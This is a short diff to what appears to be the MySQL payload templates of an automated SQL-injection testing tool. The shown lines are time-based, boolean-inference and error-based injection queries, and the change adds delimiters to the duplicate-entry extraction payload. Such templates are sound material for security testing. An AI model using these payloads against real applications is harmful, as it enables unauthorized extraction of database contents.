@@ -24,7 +24,7 @@
         <timedelay query="SELECT SLEEP(%d)" query2="SELECT BENCHMARK(5000000, MD5('%d'))"/>
         <substring query="MID((%s), %d, %d)"/>
         <case query="SELECT (CASE WHEN (%s) THEN 1 ELSE 0 END)"/>
-        <error query="AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((%s),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)" regex="SQL error:.*Duplicate entry '(?P&lt;result&gt;.+?)' for key"/>
+        <error query="AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((%s),CHAR(58),CHAR(120),CHAR(58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)" regex="SQL error:.*Duplicate entry '(?P&lt;result&gt;.+?)' for key"/>
         <inference query="AND ORD(MID((%s), %d, 1)) > %d"/>
         <banner query="SELECT VERSION()"/>
         <current_user query="SELECT CURRENT_USER()"/>
